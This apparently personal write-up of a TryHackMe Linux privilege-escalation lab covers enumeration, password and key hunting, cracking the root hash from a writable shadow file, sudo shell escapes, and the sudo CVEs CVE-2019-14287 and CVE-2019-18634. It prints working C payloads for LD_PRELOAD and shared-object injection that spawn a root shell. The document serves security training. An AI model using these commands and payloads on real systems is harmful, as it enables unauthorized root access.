---
title: Linux PrivEsc Arena
author: siresire
date: 2024-03-19 9:10:00 +0800
categories: [TryHackMe]
tags: [TCM,linux,CVE]
render_with_liquid: false
---

  ## Help links 
  
  1. Basic Linux Privilege Escalation:  [🔗](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
  2. Linux Advanced Privilege Escalation: [🔗](https://github.com/JameelNabbo/Linux-advanced-privilege-escalation/blob/master/Linux%20Advanced%20Privilege%20Escalation.pdf)
  3. Basics of linux[🔗](https://sushant747.gitbooks.io/total-oscp-guide/content/basics_of_linux.html)

# Initial enumeration

## System Enumeration

### 1. Checking the kernel verison
Checking the kernel version using the command `uname -a ` or `cat /proc/version` or `cat /etc/issue` returns

```yaml
TCM@debian:~$ uname -a
Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64 GNU/Linux
TCM@debian:~$ cat /proc/version
Linux version 2.6.32-5-amd64 (Debian 2.6.32-48squeeze6) (jmm@debian.org) (gcc version 4.3.5 (Debian 4.3.5-4) ) #1 SMP Tue May 13 16:34:35 UTC 2014
TCM@debian:~$ cat /etc/issue
Debian GNU/Linux 6.0 \n \l

TCM@debian:~$ 
```


### 2. Checkning the architecture 

If you want to check the architecture of the kernel or machine, you can utilize the `lscpu` command.

```yaml
TCM@debian:~$ lscpu
Architecture:          x86_64
CPU op-mode(s):        64-bit
CPU(s):                1
Thread(s) per core:    1
Core(s) per socket:    1
CPU socket(s):         1
NUMA node(s):          1
Vendor ID:             GenuineIntel
CPU family:            6
Model:                 63
Stepping:              2
CPU MHz:               2400.012
Hypervisor vendor:     Xen
Virtualization type:   full
L1d cache:             32K
L1i cache:             32K
L2 cache:              256K
L3 cache:              30720K
TCM@debian:~$ 
```
### Checking the process running

TO check the process running on the system we use the command `ps`

![Alt text](/assets/img/tryhackme/ln/ln1.png)

## Users Enumeration

Here, you can determine your user identity, assess your permissions, and understand your capabilities.

Executing the `whoami` command reveals your current user identity on the machine.

```
TCM@debian:~$ whoami
TCM

```

Checking permissions with the `id` command.

```yaml
TCM@debian:~$ id
uid=1000(TCM) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
TCM@debian:~$ 
```
The output above indicates that we belong to the user group and not the root group, meaning we lack administrative permissions.

To check the permissions available for running commands without root privileges, we can utilize the `sudo -l` command.

```bash
TCM@debian:~$ sudo -l
Matching Defaults entries for TCM on this host:
    env_reset, env_keep+=LD_PRELOAD

User TCM may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/sbin/apache2
    (root) NOPASSWD: /bin/more
TCM@debian:~$ 
```

Checking the users listed in the file `/etc/passwd`

```bash
TCM@debian:~$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
TCM:x:1000:1000:user,,,:/home/user:/bin/bash
 
```

If we can access sensitive information such as the `/etc/shadow` file, we are able to o the `/etc/group` file

![Alt text](/assets/img/tryhackme/ln/ln2.png)

The `/etc/shadow` file typically contains encrypted password hashes for user accounts on a Unix/Linux system. It also stores other user-related information such as password expiration dates and account locking status.

## Network Enumeration
Here you unserstand what IP architectures is , what open ports are there 

Checking the IP address and related information using the `ip addr` command

```bash
TCM@debian:~$ ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 16436 qdisc noqueue state UNKNOWN 
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc pfifo_fast state UP qlen 1000
    link/ether 02:49:11:d5:7b:53 brd ff:ff:ff:ff:ff:ff
    inet 10.10.21.102/16 brd 10.10.255.255 scope global eth0
    inet6 fe80::49:11ff:fed5:7b53/64 scope link 
       valid_lft forever preferred_lft forever

```

the `ip route` command facilitates management of the IP routing table, empowering you to view, configure, and manipulate network routing information."

```bash
TCM@debian:~$ ip route
10.10.0.0/16 dev eth0  proto kernel  scope link  src 10.10.21.102 
default via 10.10.0.1 dev eth0 

```

Checking the routing tables, which are used to determine the destinations you are communicating with, may reveal machines you are communicating with frequently. This can be accomplished using commands such as `arp -a` or `ip neigh`.

```bash
TCM@debian:~$ ip neigh 
10.10.0.1 dev eth0 lladdr 02:c8:85:b5:5a:aa REACHABLE
TCM@debian:~$ arp -a
ip-10-10-0-1.eu-west-1.compute.internal (10.10.0.1) at 02:c8:85:b5:5a:aa [ether] on eth0

```

Checking the open ports using the command `netstat -ano`

![Alt text](/assets/img/tryhackme/ln/ln3.png)

netstat command  is used to display network-related information such as active network connections, routing tables, interface statistics, masquerade connections, and multicast memberships. 

## Password Hunting 

Searching for anything that contains a password in the `/` file using the command

`grep --color=auto -rnw '/'  -ie "PASSWORD" --color=always 2>/dev/null` 

![Alt text](/assets/img/tryhackme/ln/ln4.png)

or use "PASSWORD="  in the command 

![Alt text](/assets/img/tryhackme/ln/ln5.png)


looking for the phrase password as a file name using the command `locate password | more`

```bash

TCM@debian:~$ locate password| more
locate: warning: database `/var/cache/locate/locatedb' is more than 8 days old (actual age is 1370.9 days)
/boot/grub/password.mod
/boot/grub/password_pbkdf2.mod
/etc/pam.d/common-password
/usr/lib/grub/i386-pc/password.mod
/usr/lib/grub/i386-pc/password_pbkdf2.mod
/usr/share/pam/common-password
/usr/share/pam/common-password.md5sums
/var/cache/debconf/passwords.dat
/var/lib/pam/password
TCM@debian:~$ 
```

finding keys using the command `find`

i.e `find \ -name key 2>/dev/null`

```bash
TCM@debian:~$ find / -name keys 2>/dev/null
/proc/keys
/proc/sys/kernel/keys
TCM@debian:~$ find / -name id_rsa 2>/dev/null
/backups/supersecretkeys/id_rsa
TCM@debian:~$ 
```

# Exploring Automated Tools

Resources


- [LinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

- [LinEnum](https://github.com/rebootuser/LinEnum)

- [Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester)

- [Linux Priv Checker](https://github.com/sleventyeleven/linuxprivchecker)


# Escalation Path: Kernel Exploits
## Escalation Path: Overview

[Kernel Exploits](https://github.com/lucyoa/kernel-exploits)


![Alt text](/assets/img/tryhackme/ln/ln6.png)


## Escalation via Kernel Exploit

rechecking the kernel verison again using the command `uname -a`

```bash
TCM@debian:~$ uname -a
Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64 GNU/Linux
TCM@debian:~$ 
```

googling the verison in the web, we found out that is exploitable by `CVE:2016-5195`, [Dirty COW](https://www.exploit-db.com/exploits/40839)

Also if you run linux-exploit-suggester you will see dirty-cow
```bash
TCM@debian:~/tools/linux-exploit-suggester$ ./linux-exploit-suggester.sh  | grep cow
[+] [CVE-2016-5195] dirtycow
   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
[+] [CVE-2016-5195] dirtycow 2
   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails

```
![Alt text](/assets/img/tryhackme/ln/ln7.png)


# Escalation Path: Passwords & File Permissions
## Overview

Here toy look for things like stored passwords,weak file permissions and also look for ssh-keys

## Escalation via Stored Password

Checking the history file ,there was a password stored in the history

![Alt text](/assets/img/tryhackme/ln/ln8.png)

Also in the home directory, there is a vpn file with authorization fetching credentials from a different file 

  ![Alt text](/assets/img/tryhackme/ln/ln12.png)

## Escalation via Weak File Permissions

Cheking the permissions of the `passwd` and `shadow` files, we discover that we possess read-write access to the shadow file. This is particularly unusual since the shadow file typically holds sensitive authentication data, necessitating strict access controls.

```bash
TCM@debian:~$ ls -la /etc/passwd
-rw-r--r-- 1 root root 950 Jun 17  2020 /etc/passwd
TCM@debian:~$ ls -la /etc/shadow
-rw-rw-r-- 1 root shadow 809 Jun 17  2020 /etc/shadow
TCM@debian:~$ 

```
 Now copy the passwd file and the shadow file to local machine and then unshadow and it will git you the hashes of the users 

 ![Alt text](/assets/img/tryhackme/ln/ln9.png)

 Cheking at the hash example in [link](https://hashcat.net/wiki/doku.php?id=example_hashes)
  i found it was mode `1800`
 ![Alt text](/assets/img/tryhackme/ln/ln10.png)

 Now using hascat with the command `` It was able to crack the hash for root

  ![Alt text](/assets/img/tryhackme/ln/ln11.png)

  ## Escalation via SSH Keys

  You can either use the command `find / -name authorized_key 2> /dev/null ` to find authorized_key or `find / -name id_rsa 2> /dev/null` to find the ssh keys 

![Alt text](/assets/img/tryhackme/ln/ln13.png)



# Escalation Path: Sudo
## Sudo Overview
sudo is sth that allow system administrator to deligate athorities to give certain users or a group of users 
the ability to run some commands or all commands as root.


## Escalation via Sudo Shell Escaping

Resources
- [GTFOBins](https://gtfobins.github.io/)

Running the command `sudo -l` will show us binaries that can run with sudo privileges and checking GTFOBins on vim, w can just run the command `vim -c ':!/bin/bash` to be root

![Alt text](/assets/img/tryhackme/ln/ln14.png)

or if you check the manual for vim , you can see how to run the command with vim 

![Alt text](/assets/img/tryhackme/ln/ln15.png)


## Escalation via Intended Functionality

Resources
- [wget example](https://veteransec.com/2018/09/29/hack-the-box-sunday-walkthrough/)


Suppose you are a website admin and we need access to this apache2 to maintain the website and manage it 

```zsh
TCM@debian:~$ sudo -l 
    (root) NOPASSWD: /usr/sbin/apache2
TCM@debian:~$ 
```

now googling, I found that this [website](https://touhidshaikh.com/blog/2018/04/abusing-sudo-linux-privilege-escalation/)


![Alt text](/assets/img/tryhackme/ln/ln16.png)

tryign out wiht the command `sudo apache2 -f /etc/shadow` as you can see we are able to see the contents of the shadow files

![Alt text](/assets/img/tryhackme/ln/ln17.png)

## Escalation via LD_PRELOAD

when checking `sudo -l `

we get ,which is an environment variable `LD_PRELOAD`

```zhs
TCM@debian:~$ sudo -l | grep LD_PRELOAD
    env_reset, env_keep+=LD_PRELOAD
TCM@debian:~$ 

```

`LD_PRELOAD` is also known as preloading.Is a feature of the LD , which is a dynamic linker.So to exploit this 
you are going to pre-loading a library,user specified library.
So run sudo with that `LD_PRELOAD` and run it on any command you want 
To exploit it , make a malicious file `.c`

```c
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>


void _init(){
  unsetenv("LD_PRELOAD"); 
  setgid(0);
  setuid(0);
  system("/bin/bash");

}
```
![Alt text](/assets/img/tryhackme/ln/ln18.png)

-fPIC: This option instructs the compiler to generate Position Independent Code (PIC). PIC is necessary for shared libraries because it allows the code to be loaded at any memory address, enabling it to be shared among multiple processes without conflict.

-shared: This option specifies that the output should be a shared library. Shared libraries contain code that can be loaded into memory and shared among multiple executable programs. This allows for efficient use of memory and facilitates code reuse.

-nostartfiles: This option tells the linker not to include the standard system startup files when linking. These startup files contain code that sets up the runtime environment for the executable, but for shared libraries, this code is unnecessary since they are typically loaded into a running process rather than being executed directly.

## CVE-2019-14287 Overview
Resources

- [Exploit-DB for CVE-2019-14287](https://www.exploit-db.com/exploits/47502)

The vulnerability we're interested in for this task occurs in a very particular scenario. Say you have a user who you want to grant extra permissions to. You want to let this user execute a program as if they were any other user, but you don't want to let them execute it as root. You might add this line to the sudoers file:

```bash
User hacker sudo privilege in /etc/sudoers

# User privilege specification
root    ALL=(ALL:ALL) ALL

hacker ALL=(ALL,!root) /bin/bash
```

This would let your user execute any command as another user, but would (theoretically) prevent them from executing the command as the superuser/admin/root. In other words, you can pretend to be any user, except from the admin.

With the above configuration, using `sudo -u#0 <command>` (the UID of root is always 0) would not work, as we're not allowed to execute commands as root. If we try to execute commands as user 0 we will be given an error. Enter CVE-2019-14287.

![Alt text](/assets/img/tryhackme/ln/ln43.png)


## Overview and Escalation via CVE-2019-18634

In `/etc/sudoers` you can add things to the file in order to give lower-privileged users extra permissions but in this CVE the `pwfeedback` option is purely aesthetic, and is usually turned off by default.`pwfeedback` displays asterisks for each character typed in Linux terminal passwords, specified in `/etc/sudoers`.

checking the sudo version
```bash
tryhackme@sudo-bof:~$ sudo -V
Sudo version 1.8.21p2
Sudoers policy plugin version 1.8.21p2
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.21p2
```
In the CVE ,Turning on this option in Linux can lead to a buffer overflow attack on the sudo command. It occurs when input data exceeds the allocated storage, allowing an attacker to inject code. By filling the password box with excess data, unauthorized access to root privileges is possible. Unlike previous vulnerabilities, this exploit doesn't require specific permissions to execute.

![Alt text](/assets/img/tryhackme/ln/ln44.png)

Using Perl, we generate extensive data piped into the sudo command as a password. Despite not granting root permissions, it triggers a Segmentation fault error, revealing a buffer overflow vulnerability. Exploiting this vulnerability remains our next step.

![Alt text](/assets/img/tryhackme/ln/ln45.png)
This C program exploits CVE-2019-18634. While buffer overflow (BOF) attacks are complex, this program essentially fills the password field with junk data, overwriting crucial information in the subsequent memory "box" with code granting root shell access.

# SUID

using the command `find / -perm -u=s -type f 2>/dev/null ` we can search for setuid (suid) files that are executable files that run with the permissions of the file owner, regardless of who executes them.

![Alt text](/assets/img/tryhackme/ln/ln46.png)

we found the suid sticky bit
```bash
TCM@debian:~$ ls -la /usr/bin/chsh
-rwsr-xr-x 1 root root 37552 Feb 15  2011 /usr/bin/chsh
TCM@debian:~$ 

```

# Escalation via Shared Object Injection
Using the command find to locate files within the root directory (/) of the system that have the setuid (set user ID) bit set. When the setuid bit is set on an executable file, it runs with the permissions of the file owner, typically allowing users to execute the file with elevated privileges. 

![Alt text](/assets/img/tryhackme/ln/ln47.png)
```bash
TCM@debian:~$ find / -type f -perm -04000 -ls 2>/dev/null | grep staff
816078   12 -rwsr-sr-x   1 root     staff        9861 May 14  2017 /usr/local/bin/suid-so
816762    8 -rwsr-sr-x   1 root     staff        6883 May 14  2017 /usr/local/bin/suid-env
816764    8 -rwsr-sr-x   1 root     staff        6899 May 14  2017 /usr/local/bin/suid-env2
TCM@debian:~$ 
```
Checking on `/usr/local/bin/suid-so` , which is shared object injection
```bash
TCM@debian:~$ ls -la /usr/local/bin/suid-so
-rwsr-sr-x 1 root staff 9861 May 14  2017 /usr/local/bin/suid-so
TCM@debian:~$ 
TCM@debian:~$ /usr/local/bin/suid-so
Calculating something, please wait...
[=====================================================================>] 99 %
Done.
TCM@debian:~$ 
```
It has both the SUID and SGID environment variables set and running the file it shows just Calculating and nothing much
To see it in action, we can use the command `strace` to check actually what's happening 

It troughs a bunch process but we filter out wiht grep command and there is one which is outtranding 

![Alt text](/assets/img/tryhackme/ln/ln48.png)

So we create a file so that when that process run it founds out the file and tricks a malicious activity

```c
#include <stdio.h>
#include <stdlib.h>

static void inject()__attribute__((constructor));
void inject() {
  system("cp /bin/bash /tmp/bash && chmod +x /tmp/bash && /tmp/bash -p");
}
```

after saving the file we copile it and run
![Alt text](/assets/img/tryhackme/ln/ln49.png)


## Escalation via Binary Symlinks

Resources
- [Nginx Exploit](https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html)

## Escalation via Environmental Variables
Checking the environment variables using the command `env` we can see alot of details here
![Alt text](/assets/img/tryhackme/ln/ln50.png)

## 🐞 CVE-2019-14287, CVE-2019-18634, CVE-2016-1247